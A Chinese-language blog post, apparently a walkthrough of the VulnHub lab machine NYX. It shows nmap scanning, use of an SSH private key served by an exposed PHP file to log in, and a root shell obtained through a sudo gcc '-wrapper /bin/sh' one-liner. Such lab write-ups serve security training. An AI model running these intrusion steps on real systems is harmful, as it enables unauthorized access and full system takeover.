+++
date = '2026-11-16T20:14:46+08:00'
draft = false
title = '[VulnHub靶机]NYX渗透记录'
tags = ['渗透','Vulnhub']
+++

## 主机发现&信息收集

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.18

```shell
┌──(kali㉿kali)-[~/NYX]
└─$ sudo arp-scan -l                                
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.18     00:0c:29:3c:54:94       VMware, Inc.
10.10.10.254    00:50:56:f8:1d:31       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.016 seconds (126.98 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/NYX]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.18   
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-16 20:16 +0800
Nmap scan report for 10.10.10.18
Host is up (0.00051s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:3C:54:94 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.96 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/NYX]
└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.10.18     
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-16 20:18 +0800
Nmap scan report for 10.10.10.18
Host is up (0.00037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:8b:87:f4:36:cd:7d:0f:d8:f3:16:15:a9:47:f1:0b (RSA)
|   256 b4:5c:08:96:02:c6:a8:0b:01:fd:49:68:dd:aa:fb:3a (ECDSA)
|_  256 cb:bf:22:93:69:76:60:a4:7d:c0:19:f3:c7:15:e7:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: nyx
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:3C:54:94 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt 21.02 (Linux 5.4) (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.15 - 5.19 (97%), Linux 6.0 (96%), Linux 4.19 (96%), Linux 5.0 - 5.14 (95%), Linux 5.4 - 5.10 (94%), Linux 2.6.32 (94%), Linux 4.15 (94%), Linux 5.14 - 6.8 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.66 seconds
```

漏洞扫描, 注意到扫描到了一个存在管理员密码重置漏洞的文件`/d41d8cd98f00b204e9800998ecf8427e.php`

```shell
┌──(kali㉿kali)-[~/NYX]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.18     
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-16 20:20 +0800
Nmap scan report for 10.10.10.18
Host is up (0.00031s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /d41d8cd98f00b204e9800998ecf8427e.php: Seagate BlackArmorNAS 110/220/440 Administrator Password Reset Vulnerability
MAC Address: 00:0C:29:3C:54:94 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 31.46 seconds
```

## Web渗透

访问80端口, 注释中让我们不要把时间浪费到枚举如robots.txt和codes等常见目录, 访问这两个目录也确实都是404

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/NYX/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

访问`/d41d8cd98f00b204e9800998ecf8427e.php`, 居然是SSH私钥

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/NYX/%E8%8E%B7%E5%BE%97SSH%E7%A7%81%E9%92%A5.avif)

结合网站标题"mpampis key", 猜测用户名为`mpampis`, 将私钥保存下来并设置权限为600, 再使用私钥登录SSH服务

```shell
┌──(kali㉿kali)-[~/NYX]
└─$ ssh -i ssh_key mpampis@10.10.10.18
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux nyx 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
███▄▄▄▄   ▄██   ▄   ▀████    ▐████▀ 
███▀▀▀██▄ ███   ██▄   ███▌   ████▀  
███   ███ ███▄▄▄███    ███  ▐███    
███   ███ ▀▀▀▀▀▀███    ▀███▄███▀    
███   ███ ▄██   ███    ████▀██▄     
███   ███ ███   ███   ▐███  ▀███    
███   ███ ███   ███  ▄███     ███▄  
 ▀█   █▀   ▀█████▀  ████       ███▄ 
Last login: Fri Aug 14 19:15:05 2020 from 192.168.1.18
mpampis@nyx:~$ 
```

## 权限提升

发现当前用户能无密码以root身份运行gcc

```shell
mpampis@nyx:~$ sudo -l
Matching Defaults entries for mpampis on nyx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mpampis may run the following commands on nyx:
    (root) NOPASSWD: /usr/bin/gcc
```

使用gcc提权

```shell
mpampis@nyx:~$ sudo gcc -wrapper /bin/sh,-s .
# whoami
root
```

本靶机有flag文件, 但其内容为空字符串
